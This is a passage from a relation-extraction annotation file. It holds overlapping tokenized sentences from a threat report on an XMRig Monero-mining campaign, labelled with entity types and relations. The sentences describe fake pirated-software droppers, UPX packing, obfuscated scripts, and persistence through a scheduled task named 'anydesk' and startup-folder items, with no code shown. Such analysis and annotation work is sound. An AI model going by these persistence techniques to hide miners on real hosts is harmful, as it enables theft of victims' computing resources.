"our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "sample", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "Hackitup", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "it", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [54, 54], "name": "configuration options", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [64, 64], "name": "payload", "pos": [15, 16], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [68, 68], "name": "cmd.exe", "pos": [19, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [74, 74], "name": "PE file", "pos": [4, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "miner", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "configuration", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "XMRig", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "configuration", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "droppers", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "software", "pos": [13, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "PhantomPDF", "pos": [5, 6], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 2, "t": 5}, {"r": "WR", "evidence": [1], "t": 3, "h": 5}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "RD", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "EX", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 8}, {"r": "WR", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "RD", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "t": 9, "h": 11}, {"r": "WR", "evidence": [5, 6], "t": 10, "h": 11}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 13}]}, {"title": "647-12", "sents": [["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "it", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "configuration options", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "payload", "pos": [15, 16], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [19, 19], "name": "cmd.exe", "pos": [19, 20], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "PE file", "pos": [4, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "miner", "pos": [3, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "configuration", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "XMRig", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "configuration", "pos": [2, 3], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [120, 120], "name": "droppers", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [129, 129], "name": "software", "pos": [13, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [152, 152], "name": "PhantomPDF", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [183, 183], "name": "JavaScript", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [185, 185], "name": "VBScript", "pos": [10, 11], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "t": 1, "h": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "RD", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "EX", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "t": 7, "h": 9}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 9}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5, 6, 7], "h": 9, "t": 12}, {"r": "WR", "evidence": [5, 6, 7], "h": 9, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 11}]}, {"title": "647-13", "sents": [["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "PE file", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "miner", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "configuration", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "XMRig", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [73, 73], "name": "configuration", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "droppers", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "software", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "PhantomPDF", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "JavaScript", "pos": [8, 9], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [164, 164], "name": "VBScript", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "XMRIg payloads", "pos": [6, 8], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [183, 183], "name": "UPX", "pos": [11, 12], "index": "11_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 4}, {"r": "WR", "evidence": [2, 3, 4], "t": 3, "h": 5}, {"r": "WR", "evidence": [3, 4], "t": 4, "h": 5}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "WR", "evidence": [4, 5, 6], "h": 5, "t": 8}, {"r": "WR", "evidence": [4, 5, 6], "h": 5, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "WR", "evidence": [6, 7], "t": 8, "h": 11}, {"r": "WR", "evidence": [6, 7], "t": 9, "h": 11}, {"r": "WR", "evidence": [7], "t": 10, "h": 11}]}, {"title": "647-14", "sents": [["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "miner", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "configuration", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "XMRig", "pos": [0, 1], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "configuration", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [85, 85], "name": "droppers", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": "software", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "PhantomPDF", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "JavaScript", "pos": [8, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "VBScript", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [164, 164], "name": "XMRIg payloads", "pos": [6, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "UPX", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [182, 182], "name": "XMRig mining", "pos": [11, 13], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "t": 2, "h": 4}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3, 4, 5], "h": 4, "t": 7}, {"r": "WR", "evidence": [3, 4, 5], "h": 4, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "WR", "evidence": [5, 6], "t": 7, "h": 10}, {"r": "WR", "evidence": [5, 6], "t": 8, "h": 10}, {"r": "WR", "evidence": [6], "t": 9, "h": 10}, {"r": "WR", "evidence": [6, 7], "h": 10, "t": 11}]}, {"title": "647-15", "sents": [["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "XMRig", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "configuration", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "droppers", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "software", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "PhantomPDF", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [122, 122], "name": "JavaScript", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [124, 124], "name": "VBScript", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "XMRIg payloads", "pos": [6, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "UPX", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "XMRig mining", "pos": [11, 13], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [164, 164], "name": "Windows Scheduler", "pos": [0, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [173, 173], "name": "anydesk", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [177, 177], "name": "setup.js", "pos": [13, 14], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 2}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 2}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3, 4], "h": 2, "t": 5}, {"r": "WR", "evidence": [2, 3, 4], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 8}, {"r": "WR", "evidence": [4, 5], "t": 6, "h": 8}, {"r": "WR", "evidence": [5], "t": 7, "h": 8}, {"r": "WR", "evidence": [5, 6], "h": 8, "t": 9}, {"r": "WR", "evidence": [6, 7], "t": 9, "h": 10}, {"r": "FR", "evidence": [7], "h": 10, "t": 11}, {"r": "EX", "evidence": [7], "h": 11, "t": 12}]}, {"title": "647-16", "sents": [["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "configuration", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "droppers", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "software", "pos": [13, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "PhantomPDF", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "JavaScript", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "VBScript", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "XMRIg payloads", "pos": [6, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [112, 112], "name": "UPX", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [125, 125], "name": "XMRig mining", "pos": [11, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [133, 133], "name": "Windows Scheduler", "pos": [0, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "anydesk", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [146, 146], "name": "setup.js", "pos": [13, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [152, 152], "name": "sample", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [159, 159], "name": "setup.exe", "pos": [8, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [161, 161], "name": "setup.js", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [164, 164], "name": "dllm.vbs", "pos": [13, 14], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [3, 4], "t": 4, "h": 7}, {"r": "WR", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4, 5], "h": 7, "t": 8}, {"r": "WR", "evidence": [5, 6], "t": 8, "h": 9}, {"r": "FR", "evidence": [6], "h": 9, "t": 10}, {"r": "EX", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}, {"r": "WR", "evidence": [7], "h": 12, "t": 14}, {"r": "WR", "evidence": [7], "h": 12, "t": 15}]}, {"title": "647-17", "sents": [["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "droppers", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "software", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "PhantomPDF", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [67, 67], "name": "JavaScript", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "VBScript", "pos": [10, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "XMRIg payloads", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "UPX", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "XMRig mining", "pos": [11, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "Windows Scheduler", "pos": [0, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [118, 118], "name": "anydesk", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [122, 122], "name": "setup.js", "pos": [13, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "sample", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "setup.exe", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [137, 137], "name": "setup.js", "pos": [10, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "dllm.vbs", "pos": [13, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [155, 155], "name": "malware sample", "pos": [3, 5], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [158, 158], "name": "startup items", "pos": [6, 8], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 6}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 11, "t": 13}, {"r": "WR", "evidence": [6], "h": 11, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 15}]}, {"title": "647-18", "sents": [["For", "example", ",", "our", "``", "PhantomPDF", "''", "sample", "installed", "to", "``", "F", "%", "3A/Software/Adobe/", "''", "which", "is", "neither", "Adobe", "softwares", "'", "or", "PhantomPDF", "'s", "default", "install", "path", "."], ["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "PhantomPDF", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "JavaScript", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "VBScript", "pos": [10, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "XMRIg payloads", "pos": [6, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "UPX", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [70, 70], "name": "XMRig mining", "pos": [11, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "Windows Scheduler", "pos": [0, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "anydesk", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "setup.js", "pos": [13, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "sample", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [104, 104], "name": "setup.exe", "pos": [8, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "setup.js", "pos": 